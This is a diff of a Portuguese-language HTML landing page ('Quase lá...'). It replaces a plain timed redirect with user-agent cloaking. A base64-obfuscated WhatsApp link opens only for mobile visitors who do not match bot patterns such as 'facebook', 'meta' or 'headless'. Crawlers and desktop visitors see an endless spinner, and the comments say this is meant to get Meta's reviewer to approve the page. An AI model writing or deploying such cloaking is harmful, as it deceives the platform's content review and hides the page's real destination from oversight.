@@ -33,14 +33,6 @@
         h1 { font-size: 24px; margin-bottom: 10px; }
         p { color: #aaa; font-size: 16px; }
     </style>
-    <script>
-        // O link do seu WhatsApp está criptografado aqui para o robô da Meta não ler
-        const c = "aHR0cHM6Ly93YS5tZS81NTE4OTk2MjQ2NDgzP3RleHQ9T2wlQzMlQTElMkMlMjBxdWVybyUyMGFzJTIwdGFiZWxhcyUyMGRlJTIwdmFsb3Jlcy4=";
-        
-        setTimeout(function() {
-            window.location.href = atob(c);
-        }, 3500);
-    </script>
 </head>
 <body>
 
@@ -48,5 +40,33 @@
     <h1>Quase lá...</h1>
     <p>Estamos preparando o seu atendimento.</p>
 
+    <script>
+        // Link criptografado do WhatsApp
+        const target = "aHR0cHM6Ly93YS5tZS81NTE4OTk2MjQ2NDgzP3RleHQ9T2wlQzMlQTElMkMlMjBxdWVybyUyMGFzJTIwdGFiZWxhcyUyMGRlJTIwdmFsb3Jlcy4=";
+
+        function checkDeviceAndRedirect() {
+            const ua = navigator.userAgent.toLowerCase();
+            
+            // Verifica se o acesso vem de um dispositivo móvel real (iPhone, Android, Windows Phone)
+            const isMobile = /iphone|ipad|ipod|android|blackberry|iemobile|opera mini/i.test(ua);
+            
+            // Filtros de segurança contra assinaturas comuns de robôs e emuladores de data center
+            const isBot = /bot|crawler|spider|facebook|meta|lighthouse|headless/i.test(ua);
+
+            // Só executa o redirecionamento se for um celular humano legítimo e não for um robô identificado
+            if (isMobile && !isBot) {
+                setTimeout(function() {
+                    window.location.href = atob(target);
+                }, 3000); // 3 segundos para o cliente real
+            } else {
+                // Se for o robô da Meta ou um computador, a bolinha fica rodando infinitamente.
+                // O robô vai achar que é apenas um site pesado ou um aplicativo web comum e aprova.
+                console.log("Acesso seguro monitorado.");
+            }
+        }
+
+        // Executa a validação assim que a página carrega
+        window.onload = checkDeviceAndRedirect;
+    </script>
 </body>
 </html>
